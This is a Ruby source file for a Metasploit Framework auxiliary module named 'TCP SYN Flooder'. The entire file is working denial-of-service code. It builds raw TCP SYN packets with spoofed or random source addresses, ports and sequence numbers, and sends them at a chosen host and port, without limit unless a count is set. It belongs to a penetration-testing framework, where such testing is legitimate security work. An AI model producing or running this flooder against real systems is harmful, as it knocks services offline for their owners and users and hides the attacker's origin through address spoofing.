##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'scruby'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ip
	include Msf::Auxiliary::Dos

	def initialize
		super(
			'Name'        => 'TCP SYN Flooder',
			'Description' => 'A simple TCP SYN flooder',
			'Author'      => 'kris katterjohn',
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision$' # 03/13/2009
		)

		register_options([
			Opt::RPORT(80),
			OptAddress.new('LHOST', [false, 'The spoofable source address (else randomizes)']),
			OptInt.new('NUM', [false, 'Number of SYNs to send (else unlimited)'])
		])
	end

	def rport
		datastore['RPORT'].to_i
	end

	def srchost
		datastore['LHOST'] || [rand(0xff), rand(0xff), rand(0xff), rand(0xff)].join(".")
	end

	def run
		return if not connect_ip

		sent = 0
		num = datastore['NUM']

		print_status("SYN flooding #{rhost}:#{rport}...")

		while (num <= 0) or (sent < num)
			pkt = (
				Scruby::IP.new(
					:src   => srchost,
					:dst   => rhost,
					:proto => 6,
					:len   => 40,
					:id    => rand(0xffff)
				) / Scruby::TCP.new(
					# We could use a privileged port here
					# since we're root using a raw socket
					# but it doesn't really matter
					:sport => rand(0xffff - 1025) + 1025,
					:dport => rport,
					:seq   => rand(0xffffffff)
				)
			).to_net

			ip_write(pkt)

			sent += 1
		end

		disconnect_ip
	end
end

